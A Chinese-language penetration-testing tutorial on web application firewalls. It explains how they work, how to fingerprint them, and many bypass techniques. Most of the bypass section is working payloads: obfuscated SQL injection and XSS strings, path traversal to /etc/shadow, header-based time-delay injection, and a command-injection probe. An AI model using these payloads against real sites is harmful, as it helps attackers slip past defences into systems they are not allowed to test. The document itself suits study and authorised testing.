## WAF的介绍

WAF( Web Application Firewall )
Web应用防火墙，部署在web应用程序前面，在用户请求到达web服务器前对用户请求进行扫描和过滤，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离。通过检查HTTP流量，可以防止源自web应用程序的安全漏洞（如注入漏洞、XSS漏洞、命令执行漏洞、文件包含漏洞等）的攻击。

## WAF的工作原理

WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录

### 1\. 预处理

预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。

### 2\. 规则检测

每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。

### 3\. 处理模块

针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。  
不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。  
这个[网站](https://cloud.tencent.com/developer/article/1872310)收录了一些常见的WAF产品的界面

### 4\. 日志记录

WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。

## WAF的分类

### 1.硬件型WAF

（产商安装）（绿盟、深信服）：以硬件形式部署在链路中  
_串联在内网的交换机上，防护范围大_

### 2.云WAF

（阿里云，腾讯云，华为云....)：通过配置NS或者CNAME记录，使得对网站的请求报文优先经过WAF主机，经过WAF主机过滤之后，将被认为无害的请求报文再送给实际的网站服务器进行请求

![](./img/4626118013798667276.png)  
（比如某学校的第二课堂就用了深信服的云安全产品，不一定是WAF）  
_基于云端的检测，安装简单，修改 DNS 解析或在服务器安装云 WAF 的模块即可_

### 3.软件型WAF

（部署在Apache，Nginx等HTTPServer中）（安全狗、D盾、云锁等）  
以软件的形式安装在服务器上  
_安装在服务器上，根据网站流量决定占用内存量_

### 4.自定义WAF

（自己写的一些规则）  
_在系统后台内置一项安全功能以便管理者使用_

## WAF的判断--工具/手动

### 1.sqlmap

如果网站有waf的话，我们在使用sqlmap对这个网站进行扫描的时候会有提示  
（含有很多payload的字典，然后其中有的payload触发了网站的waf，故waf也不一定会被触发）  
比如：

    
    
    python sqlmap.py -u "https://www.xxx.edu.cn/"

![](./img/7314762143029438239.png)

### 2.Wafw00f

kali下自带

    
    
    wafwoof https://baidu.com

![](./img/2242099924422896606.png)

### 3.手动测试

#### _HTTP 请求包分析响应数据_

通过对网站的正常访问，查看响应的头部信息。  
例如在 X-Powered-By 内显示 “anyu.qianxin.com” 的标识，代表安装了奇安信WAF  
比如：我们测试一个网站是否用了奇安信的产品，我们就可以把他抓包来验证一下

![](./img/6240829822899916532.png)

#### _请求恶意字符分析响应或敏感页面_

比如阿里云盾（aliyundun）  
我们用一个网站测试一下  
我们输入一个敏感的路径

    
    
    ?shopId='bin/cat/etc/passwd; ping 127.0.0.1; curl google.com'

然后可以看到页面出现了阿里云盾的防火墙拦截页面

![](./img/5401363249621373873.png)

## WAF的绕过

### 检测规则绕过

waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过；  
（但是随着waf的发展，现在在检测规则已经比较全面了，常见的waf一般用这些规则都绕不过去了）  
_1.大小写绕过_

    
    
    http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

_2.URL编码技术_

    
    
    被WAF阻止：UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)绕过的技术：UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29

_3.Unicode技术_

    
    
    ../../etc/shadow混淆：
    %C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow

_4.HTML编码技术_

    
    
    "><img src=x onerror=confirm()>
    实体名称有效载荷："><img src=x onerror=confirm()>
    实体编码有效载荷："><img src=x onerror=confirm()>

_5.使用注释技术_

    
    
    <script>confirm()</script>
    绕过的技术：<!--><script>confirm/**/()/**/</script>
    
    被WAF阻止：/?id=1+union+select+1,2--    绕过的技术：/?id=1+un/**/ion+sel/**/ect+1,2--
_6.通配符混淆技术_

    
    
    <iframe/onload='this["src"]="javascript:confirm()"';>
    混淆负载<iframe/onload='this["src"]="jav"+"as	cr"+"ipt:con"+"fir"+"m()"';>

_7.宽字节_

    
    
    union = uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节
    select = こхlх%уt //t不编码 其他的都宽字节 中间插上%
    from = цR%яэ //宽字节+%
    空格=%20=%ва //в是2的款字符 а是0的宽字符
    , = Ь //,号的宽字节

_8.00截断绕过_

    
    
    id=1%00and 1=2 union select 1,2,column_name from information_schema.columns

_9.溢出waf绕过_  
部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测

    
    
    ?id=1+and+sleep(3) 
    绕过payload:
    ?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

_10.协议未覆盖绕过_  
以下四种常见的content-type类型：

> Content-Type:multipart/form-data;
>
> Content-Type:application/x-www-form-urlencoded
>
> Content-Type: text/xml
>
> Content-Type: application/json

部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制。  
例如使用multipart/form-data进行绕过。  
比如：sql第九关，正常情况下

![](./img/6547119556348855974.png)  
绕过之后，发现时间明显延迟

![](./img/7238245717034971710.png)

![](./img/2633142167386778917.png)

### boundary边界混淆绕过

在首个boundary分隔符号后添加英文逗号和任意干扰字符，且再增加一个boundary分隔符混淆，通过多boundary定义，使WAF检测范围和实际上传范围不一致，从而绕过WAF。

![](./img/6736719447539298678.png)

### Cookie/X-Forwarded-For注入绕过

部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。

正常payload：

    
    
    GET /index.aspx?id=1+and+1=1 HTTP/1.1
    Host: 192.168.61.175
    Cookie: TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28
    ...........

绕过payload：

    
    
    GET /index.aspx HTTP/1.1
    Host: 192.168.61.175
    Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;
    X-Forwarded-For:127.0.0.1';WAITFOR DELAY'0:0:5'--    ...........

wawa### 利用pipline进行绕过  
当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。  
正常请求被拦截：

![](./img/6309269930029542893.png)  
利用pipline进行绕过：  
首先关闭burp的Repeater的Content-Length自动更新

![](./img/6886827854629203221.png)  
修改Connection字段值为keep-alive，将带有攻击语句的数据请求附加到正常请求后面再发送一遍。

![](./img/4909594992076004667.png)

### 分区块传输绕过

![](./img/5160461323052095219.png)  
分区块之后即可绕过

![](./img/6333183556461873865.png)

## WAF和信息收集的联系

WAF可以在信息收集阶段起到一定的作用。它可以检测和阻止一些常见的攻击技术，如SQL注入、跨站脚本（XSS）攻击、跨站请求伪造（CSRF）等。通过阻止这些攻击，  
**_WAF可以减少攻击者在信息收集阶段获得有关目标系统的敏感信息的机会。_**

此外，WAF还可以记录和分析攻击尝试的日志，从中获取有关攻击者的信息，例如攻击来源的IP地址、攻击的目标URL等。这些信息可以用于进一步的安全分析和对策制定。

WAF可以作为信息收集阶段的一种防御措施，帮助减少攻击者对目标系统的了解，并提供一定程度的安全保护。然而，需要注意的是，WAF并不能解决所有的安全问题，因此还需要综合其他安全措施来提高系统的整体安全性。

